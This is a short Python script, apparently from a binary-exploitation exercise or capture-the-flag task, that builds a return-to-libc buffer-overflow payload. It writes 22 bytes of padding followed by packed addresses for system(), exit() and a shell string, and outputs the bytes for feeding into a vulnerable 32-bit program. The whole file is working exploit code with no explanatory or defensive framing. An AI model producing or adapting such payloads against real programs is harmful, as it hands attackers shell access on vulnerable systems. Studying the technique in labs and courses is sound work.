import sys
import struct
from shellcode import shellcode

toBeOutputted = b""
addressOffset = 22
padding = b"a"*addressOffset
toBeOutputted += padding
systemAddress = 0x8052530
systemAddressToEndian = struct.pack("<I", systemAddress)
toBeOutputted += systemAddressToEndian
exitCommandAddress = 0x8050dc0
exitAddressToEndian = struct.pack("<I", exitCommandAddress)
toBeOutputted += exitAddressToEndian
shellStringAddress = 0x80be1ed
shellAddressToEndian = struct.pack("<I", shellStringAddress)
toBeOutputted += shellAddressToEndian
sys.stdout.buffer.write(toBeOutputted)

